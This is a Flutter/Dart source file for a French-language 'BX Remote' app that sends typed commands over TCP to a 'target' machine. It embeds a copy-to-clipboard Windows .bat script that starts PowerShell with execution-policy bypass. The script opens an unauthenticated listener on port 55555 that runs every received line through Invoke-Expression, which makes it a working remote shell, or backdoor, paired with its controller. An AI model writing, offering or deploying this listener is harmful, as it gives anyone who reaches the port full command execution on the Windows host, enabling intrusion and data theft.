import 'dart:io';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

void main() {
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      theme: ThemeData.dark().copyWith(
        scaffoldBackgroundColor: const Color(0xFF000000),
        primaryColor: const Color(0xFFFF0000),
      ),
      home: const RemoteControlScreen(),
    );
  }
}

class RemoteControlScreen extends StatefulWidget {
  const RemoteControlScreen({super.key});

  @override
  State<RemoteControlScreen> createState() => _RemoteControlScreenState();
}

class _RemoteControlScreenState extends State<RemoteControlScreen> with SingleTickerProviderStateMixin {
  final TextEditingController _ipController = TextEditingController(text: "192.168.1.1");
  final TextEditingController _portController = TextEditingController(text: "55555");
  final TextEditingController _commandController = TextEditingController();
  final ScrollController _scrollController = ScrollController();

  Socket? _socket;
  bool _isLoading = false;
  bool _isConnected = false;
  bool _showLogs = true;
  List<Map<String, dynamic>> logs = [];

  late AnimationController _animationController;
  late Animation<double> _scaleAnimation;

  final String _batScriptContent = r'''@echo off
title serveur local
echo lancement du serveur sur le port 55555...
powershell -NoProfile -ExecutionPolicy Bypass -Command "$listener = [System.Net.Sockets.TcpListener]55555; $listener.Start(); while ($true) { $client = $listener.AcceptTcpClient(); $stream = $client.GetStream(); $reader = New-Object System.IO.StreamReader($stream); $writer = New-Object System.IO.StreamWriter($stream); $writer.AutoFlush = $true; $writer.WriteLine('connecté au pc windows'); while ($client.Connected) { $cmd = $reader.ReadLine(); if ($cmd -eq $null) { break }; try { $out = Invoke-Expression $cmd 2>&1 | Out-String; if ([string]::IsNullOrWhiteSpace($out)) { $out = 'commande exécutée sans retour.' }; $writer.WriteLine($out); } catch { $writer.WriteLine('erreur: ' + $_.Exception.Message); } } $client.Close(); }"
pause''';

  @override
  void initState() {
    super.initState();
    _animationController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 100),
    );
    _scaleAnimation = Tween<double>(begin: 1.0, end: 0.90).animate(
      CurvedAnimation(parent: _animationController, curve: Curves.easeInOut),
    );
  }

  @override
  void dispose() {
    _animationController.dispose();
    _ipController.dispose();
    _portController.dispose();
    _commandController.dispose();
    _scrollController.dispose();
    _socket?.destroy();
    super.dispose();
  }

  void _addLog(String message, {bool isError = false}) {
    if (!mounted) return;
    setState(() {
      logs.add({
        "text": "[${DateTime.now().toString().substring(11, 19)}] ${message.toLowerCase()}",
        "isError": isError
      });
    });
    WidgetsBinding.instance.addPostFrameCallback((_) {
      if (_scrollController.hasClients) {
        _scrollController.animateTo(
          _scrollController.position.maxScrollExtent,
          duration: const Duration(milliseconds: 150),
          curve: Curves.easeOut,
        );
      }
    });
  }

  void _copyBatScript() {
    Clipboard.setData(ClipboardData(text: _batScriptContent));
    _addLog("script .bat copié.");
  }

  void _toggleConnection() async {
    if (_isConnected) {
      _disconnect();
      return;
    }

    final ip = _ipController.text.trim();
    final port = int.tryParse(_portController.text.trim());

    if (ip.isEmpty || port == null) {
      _addLog("erreur : ip ou port invalide", isError: true);
      return;
    }

    setState(() {
      _isLoading = true;
    });
    _addLog("connexion à $ip:$port...");

    try {
      _socket = await Socket.connect(ip, port, timeout: const Duration(seconds: 4));
      
      setState(() {
        _isConnected = true;
        _isLoading = false;
      });
      _addLog("connexion établie");

      _socket!.listen(
        (List<int> data) {
          final response = utf8.decode(data).trim();
          _addLog(response);
        },
        onError: (error) {
          _addLog("erreur réseau : $error", isError: true);
          _disconnect();
        },
        onDone: () {
          _addLog("connexion interrompue par la cible");
          _disconnect();
        },
      );
    } catch (e) {
      setState(() {
        _isLoading = false;
        _isConnected = false;
      });
      _addLog("échec : cible introuvable ($e)", isError: true);
    }
  }

  void _disconnect() {
    if (_socket != null) {
      _socket!.destroy();
      _socket = null;
    }
    setState(() {
      _isConnected = false;
      _isLoading = false;
    });
    _addLog("déconnecté");
  }

  void _handleCommandExecution() {
    final input = _commandController.text.trim();
    if (input.isEmpty) return;

    _commandController.clear();

    if (_socket == null) {
      _addLog("erreur : aucun appareil connecté", isError: true);
      return;
    }
    try {
      _socket!.write("$input\n");
      _addLog("> $input");
    } catch (e) {
      _addLog("erreur d'envoi : $e", isError: true);
    }
  }

  InputDecoration _customInputStyle(String label) {
    return InputDecoration(
      labelText: label,
      labelStyle: const TextStyle(color: Colors.white24, fontSize: 12),
      filled: true,
      fillColor: const Color(0xFF0A0A0A),
      contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 14),
      enabledBorder: OutlineInputBorder(
        borderRadius: BorderRadius.circular(4),
        borderSide: const BorderSide(color: Colors.white10),
      ),
      focusedBorder: OutlineInputBorder(
        borderRadius: BorderRadius.circular(4),
        borderSide: const BorderSide(color: Color(0xFFFF0000), width: 1.5),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text("[*] BX Remote [*]", style: TextStyle(fontSize: 18, letterSpacing: 1)),
        backgroundColor: const Color(0xFF000000),
        elevation: 0,
        actions: [
          TextButton(
            onPressed: _copyBatScript,
            child: const Text("copier le .bat", style: TextStyle(color: Color(0xFFFF0000), fontSize: 13)),
          )
        ],
      ),
      body: Padding(
        padding: const EdgeInsets.all(16.0),
        child: Column(
          children: [
            Row(
              children: [
                Expanded(
                  flex: 3,
                  child: TextField(
                    controller: _ipController,
                    decoration: _customInputStyle("Adresse IP cible"),
                  ),
                ),
                const SizedBox(width: 8),
                Expanded(
                  flex: 1,
                  child: TextField(
                    controller: _portController,
                    keyboardType: TextInputType.number,
                    decoration: _customInputStyle("Port"),
                  ),
                ),
              ],
            ),
            const SizedBox(height: 40),

            GestureDetector(
              onTapDown: (_) => _animationController.forward(),
              onTapUp: (_) {
                _animationController.reverse();
                if (!_isLoading) _toggleConnection();
              },
              onTapCancel: () => _animationController.reverse(),
              child: ScaleTransition(
                scale: _scaleAnimation,
                child: Stack(
                  alignment: Alignment.center,
                  children: [
                    SizedBox(
                      width: 130,
                      height: 130,
                      child: _isLoading
                          ? const CircularProgressIndicator(
                              valueColor: AlwaysStoppedAnimation<Color>(Color(0xFFFF0000)),
                              strokeWidth: 2,
                            )
                          : Container(
                              decoration: BoxDecoration(
                                shape: BoxShape.circle,
                                border: Border.all(
                                  color: _isConnected ? const Color(0xFFFF0000) : Colors.white10,
                                  width: 1.5,
                                ),
                              ),
                            ),
                    ),
                    AnimatedContainer(
                      duration: const Duration(milliseconds: 200),
                      width: 110,
                      height: 110,
                      decoration: BoxDecoration(
                        color: _isConnected ? const Color(0xFF000000) : const Color(0xFFFF0000),
                        shape: BoxShape.circle,
                        border: Border.all(
                          color: const Color(0xFFFF0000),
                          width: 2,
                        ),
                      ),
                      child: Center(
                        child: Icon(
                          _isConnected ? Icons.close : Icons.sensors,
                          color: _isConnected ? const Color(0xFFFF0000) : Colors.black,
                          size: 110,
                        ),
                      ),
                    ),
                  ],
                ),
              ),
            ),
            const SizedBox(height: 12),
            Text(
              _isConnected ? "status : [connecté]" : "statut : [deconnecté]",
              style: TextStyle(
                fontSize: 15,
                color: _isConnected ? const Color(0xFFFF0000) : Colors.white24,
              ),
            ),
            const SizedBox(height: 40),

            Row(
              children: [
                Expanded(
                  child: TextField(
                    controller: _commandController,
                    decoration: _customInputStyle("commandes a distance"),
                    onSubmitted: (_) => _handleCommandExecution(),
                  ),
                ),
                const SizedBox(width: 8),
                SizedBox(
                  height: 48,
                  child: ElevatedButton(
                    style: ElevatedButton.styleFrom(
                      backgroundColor: const Color(0xFFFF0000),
                      foregroundColor: Colors.black,
                      elevation: 0,
                      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(4)),
                    ),
                    onPressed: _handleCommandExecution,
                    child: const Icon(Icons.arrow_forward, size: 16),
                  ),
                ),
              ],
            ),
            const SizedBox(height: 20),
            
            Row(
              children: [
                const Text("logs", style: TextStyle(color: Colors.white24, fontSize: 13)),
                const Spacer(),
                GestureDetector(
                  onTap: () => setState(() => _showLogs = !_showLogs),
                  child: Text(
                    _showLogs ? "< masquer" : "> afficher",
                    style: const TextStyle(color: Color(0xFFFF0000), fontSize: 11),
                  ),
                ),
              ],
            ),
            const SizedBox(height: 8),

            if (_showLogs)
              Expanded(
                child: Container(
                  width: double.infinity,
                  decoration: BoxDecoration(
                    color: const Color(0xFF050505),
                    borderRadius: BorderRadius.circular(4),
                    border: Border.all(color: Colors.white10),
                  ),
                  padding: const EdgeInsets.all(10),
                  child: ListView.builder(
                    controller: _scrollController,
                    itemCount: logs.length,
                    itemBuilder: (context, index) {
                      final logItem = logs[index];
                      final bool isError = logItem["isError"] ?? false;
                      return Padding(
                        padding: const EdgeInsets.symmetric(vertical: 2),
                        child: Text(
                          logItem["text"] ?? "",
                          style: TextStyle(
                            color: isError ? const Color(0xFFFF3333) : Colors.white70,
                            fontFamily: "monospace",
                            fontSize: 11,
                          ),
                        ),
                      );
                    },
                  ),
                ),
              ),
          ],
        ),
      ),
    );
  }
}
